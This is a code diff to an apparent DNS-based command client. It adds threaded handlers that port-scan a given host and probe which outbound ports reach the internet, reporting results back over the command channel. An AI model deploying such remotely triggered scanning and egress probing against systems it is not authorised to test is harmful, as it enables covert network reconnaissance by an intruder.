@@ -17,6 +17,9 @@ import os
 import logging
 import subprocess
 
+from network.lib import online
+from network.lib import scan
+
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain):
         self.stream = None
@@ -89,8 +92,35 @@ class DNSCommandClientLauncher(DnsCommandsClient):
             except Exception as e:
                 logging.exception(e)
 
-    def on_checkconnect(self, host, port_start, port_end=None):
-        pass
+    def _checkconnect_worker(self, host, port_start, port_end):
+        ports = xrange(port_start, port_end+1)
+        connectable = scan.scan([str(host)], ports)
+        while connectable:
+            chunk = [ x[1] for x in connectable[:5] ]
+            connectable = connectable[5:]
+            self.event(ConnectablePort(host, chunk))
+
+    def on_checkconnect(self, host, port_start, port_end):
+        worker = Thread(target=self._checkconnect_worker, args=(
+            host, port_start, port_end))
+        worker.daemon = True
+        worker.start()
+
+    def _checkonline_worker(self):
+        portquiz = online.PortQuiz()
+        portquiz.start()
+
+        result = online.check()
+        self.event(OnlineStatus(result))
+
+        portquiz.join()
+        if portquiz.available:
+            self.event(PortQuizPort(portquiz.available[:8]))
+
+    def on_checkonline(self):
+        worker = Thread(target=self._checkonline_worker)
+        worker.daemon = True
+        worker.start()
 
     def on_connect(self, ip, port, transport, proxy=None):
         logging.debug('connect request: {}:{} {} {}'.format(ip, port, transport, proxy))
